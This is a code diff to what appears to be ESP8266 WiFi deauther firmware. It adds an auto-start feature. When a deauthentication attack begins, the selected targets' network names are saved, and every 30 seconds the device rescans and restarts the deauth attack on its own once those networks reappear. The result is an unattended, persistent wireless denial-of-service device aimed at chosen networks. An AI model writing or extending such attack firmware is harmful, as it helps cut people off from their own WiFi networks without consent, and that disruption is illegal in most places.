@@ -116,6 +116,11 @@ unsigned long prevTime = 0;
 unsigned long curTime = 0;
 int curChannel = settings.detectorChannel;
 
+// Auto Start
+unsigned long as_prevTime = 0;
+unsigned long as_curTime = 0;
+bool as_executed = false;
+
 NameList nameList;
 
 APScan apScan;
@@ -453,6 +458,15 @@ void startAttack() {
   if (server.hasArg("num")) {
     int _attackNum = server.arg("num").toInt();
     if (apScan.getFirstTarget() > -1 || _attackNum == 1 || _attackNum == 2) {
+      if (0 == _attackNum) { // deauth
+        settings.savedSSIDCnt = 0; // clear
+        for (int a = 0; a < apScan.results; a++) {
+          if (apScan.isSelected(a)) {
+            settings.savedSSID[settings.savedSSIDCnt++] = apScan.getAPName (a);
+          }
+        }
+        settings.save_ssids ();
+      }
       attack.start(server.arg("num").toInt());
       server.send ( 200, "text/json", "true");
     } else server.send( 200, "text/json", "false");
@@ -894,6 +908,19 @@ void setup() {
 }
 
 void loop() {
+  if (false == as_executed && settings.savedSSIDCnt > 0 && false == attack.attack_running (0)) {
+    // auto start attack
+    as_curTime = millis();
+    if(0 == as_prevTime || (as_curTime - as_prevTime) >= 30 * 1000) {
+      apScan.start ();
+      if (apScan.selectedSum == settings.savedSSIDCnt) {
+        attack.start (0);
+        as_executed = true;
+        Serial.println ("auto attack start.");
+      }
+      as_prevTime = as_curTime;
+    }
+  }
   if (detecting) {
     curTime = millis();
     if(curTime - prevTime >= settings.detectorScanTime){
@@ -934,7 +961,6 @@ void loop() {
         settings.reset();
       }
     }
-  
   #ifndef USE_DISPLAY
     #ifdef GPIO0_DEAUTH_BUTTON
       // Long-press  = triple LED blink + deauth all
@@ -993,7 +1019,6 @@ void loop() {
     #endif
   #endif
     
-  
 #ifdef USE_DISPLAY
 
   if (digitalRead(upBtn) == LOW || digitalRead(downBtn) == LOW || digitalRead(selectBtn) == LOW || digitalRead(displayBtn) == LOW){
